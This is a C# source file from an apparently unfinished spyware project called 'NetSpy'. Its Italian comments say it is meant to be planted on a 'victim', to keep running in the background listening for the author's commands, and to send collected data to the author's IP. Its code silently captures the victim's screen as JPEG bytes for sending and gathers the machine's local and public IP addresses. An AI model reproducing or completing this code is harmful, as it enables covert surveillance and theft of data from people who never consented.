using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using NetSpy.Model;
using System.Net.Sockets;

namespace NetSpy.Model
{
    /*
     * Da modificare, essa andrà nel programma da dare alla vittima quindi tutte le informazioni non verranno salvate ma verranno
     * inviate al mio IP tramite un port-forwarding del router e poi immagazzinate tramite il NetSpyServer -> (possibilmente startare il server con un thread)
     * 
     * Per non far chiudere il programma alla chiusura -> Lo si fa andare in background oppure si starta un thread, che continua ad ascoltare i comandi che gli invio.
     * */
    public class SpyHelper
    {
        //private GeoIPCountry geoIpCountry;
        public SpyHelper()
        {
            //geoIpCountry = new GeoIPCountry(new MemoryStream(Properties.Resources.GeoIP));
        }

        /**
         * Funzionante, problemi con la path -> Nel disco C:\ genera un eccezione.
         * **/
        public void TakeScreenshot(string path)
        {
            //Creating a new Bitmap object
            //Bitmap captureBitmap = new Bitmap(int width, int height, PixelFormat);
            Bitmap captureBitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);

            //Creating a Rectangle object which will  
            //capture our Current Screen
            Rectangle captureRectangle = Screen.AllScreens[0].Bounds;

            //Creating a New Graphics Object
            Graphics captureGraphics = Graphics.FromImage(captureBitmap);

            //Copying Image from The Screen
            captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);

            //Saving the Image File (I am here Saving it in My E drive).
            captureBitmap.Save(path, ImageFormat.Jpeg);
            //Displaying the Successfull Result
            MessageBox.Show("Screen Captured!");
        }

        public byte[] GetScreenshotData()
        {
            MemoryStream memoryStream = new MemoryStream();

            //Creating a new Bitmap object
            //Bitmap captureBitmap = new Bitmap(int width, int height, PixelFormat);
            Bitmap captureBitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);

            //Creating a Rectangle object which will  
            //capture our Current Screen
            Rectangle captureRectangle = Screen.AllScreens[0].Bounds;

            //Creating a New Graphics Object
            Graphics captureGraphics = Graphics.FromImage(captureBitmap);

            //Copying Image from The Screen
            captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);

            captureBitmap.Save(memoryStream, ImageFormat.Jpeg);

            return memoryStream.ToArray();
        }

        //TODO: NON COMPLETED
        public void RecordScreen(int time)
        {

        }


        //TODO:ADD GEOIP DATABASE
        /*
        public string getCountryLocation(IPAddress ip)
        {
            return geoIpCountry.GetCountryNameByCode(geoIpCountry.TryGetCountryCode(ip));
        }
        */

        
        public string GetLocalIpAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            throw new Exception("No network adapters with an IPv4 address in the system!");
        }

        public string GetPublicIpAddress()
        {
            String address = "";
            WebRequest request = WebRequest.Create("http://checkip.dyndns.org/");
            using (WebResponse response = request.GetResponse())
            using (StreamReader stream = new StreamReader(response.GetResponseStream()))
            {
                address = stream.ReadToEnd();
            }

            int first = address.IndexOf("Address: ") + 9;
            int last = address.LastIndexOf("</body>");
            address = address.Substring(first, last - first);

            return address;
        }
    }
}
